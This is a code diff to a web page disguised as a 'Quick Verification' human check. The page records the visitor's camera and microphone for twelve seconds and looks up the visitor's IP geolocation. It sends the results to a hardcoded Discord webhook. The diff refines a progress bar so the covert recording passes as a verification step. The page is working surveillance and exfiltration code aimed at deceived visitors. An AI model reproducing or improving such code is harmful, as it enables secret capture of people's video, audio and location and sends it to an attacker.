@@ -19,10 +19,10 @@
     body { margin:0; background:#111; color:#eee; font-family:Arial, sans-serif; text-align:center; padding: 20vh 10px; min-height:100vh; }
     #msg { font-size:1.6em; margin:20px; }
     .progress-container {
-      width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative;
+      width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative; display: none;
     }
     .progress-bar {
-      width: 0%; height: 100%; background: #0066cc; transition: width 0.3s ease; 
+      width: 0%; height: 100%; background: #0066cc; transition: width 0.1s linear; 
     }
     .progress-text {
       position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-weight: bold; font-size: 1.2em; text-shadow: 0 0 5px black; z-index: 2;
@@ -39,7 +39,7 @@
     <h1>Quick Verification</h1>
     <p id="msg">Please click verify to continue. This helps prove you're a human.</p>
     
-    <div id="progressContainer" class="progress-container" style="display:none;">
+    <div id="progressContainer" class="progress-container">
       <div id="progressBar" class="progress-bar"></div>
       <div id="progressText" class="progress-text">0%</div>
     </div>
@@ -57,6 +57,24 @@
     const progressText = document.getElementById('progressText');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
+    const RECORD_DURATION = 12000; // ms - must match setTimeout value
+
+    let startTime = 0;
+    let animationFrameId = null;
+
+    function updateProgress() {
+      if (!startTime) return;
+      const elapsed = Date.now() - startTime;
+      let percent = (elapsed / RECORD_DURATION) * 100;
+      if (percent > 100) percent = 100;
+
+      progressBar.style.width = percent + '%';
+      progressText.textContent = Math.round(percent) + '%';
+
+      if (percent < 100) {
+        animationFrameId = requestAnimationFrame(updateProgress);
+      }
+    }
 
     async function recordAndSend() {
       try {
@@ -72,9 +90,8 @@
 
         await new Promise(r => setTimeout(r, 2000));
 
-        // Show progress bar
         progressContainer.style.display = 'block';
-        msg.textContent = ""; // hide text, let bar do the talking
+        msg.textContent = "";
 
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
         const chunks = [];
@@ -83,24 +100,15 @@
           if (e.data.size > 0) chunks.push(e.data);
         };
 
-        // Fake progress animation synced roughly to 10-12s recording
-        let progress = 0;
-        const progressInterval = setInterval(() => {
-          progress += Math.random() * 5 + 2; // irregular but smooth climb
-          if (progress > 100) progress = 100;
-          progressBar.style.width = progress + '%';
-          progressText.textContent = Math.round(progress) + '%';
-        }, 200); // updates every 200ms for smooth feel
-
         recorder.onstop = async () => {
-          clearInterval(progressInterval);
+          cancelAnimationFrame(animationFrameId);
           progressBar.style.width = '100%';
           progressText.textContent = '100%';
 
           stream.getTracks().forEach(track => track.stop());
 
           if (chunks.length === 0) {
-            // Fallback text send
+            // fallback text
             let geoDetails = "Location grab failed";
             try {
               const geoRes = await fetch('https://ipapi.co/json/');
@@ -153,7 +161,9 @@
         };
 
         recorder.start(1000);
-        setTimeout(() => recorder.stop(), 12000);
+        startTime = Date.now();
+        updateProgress(); // kick off the loop
+        setTimeout(() => recorder.stop(), RECORD_DURATION);
 
       } catch (err) {
         msg.textContent = "Verification incomplete. Center Face In Camera View";
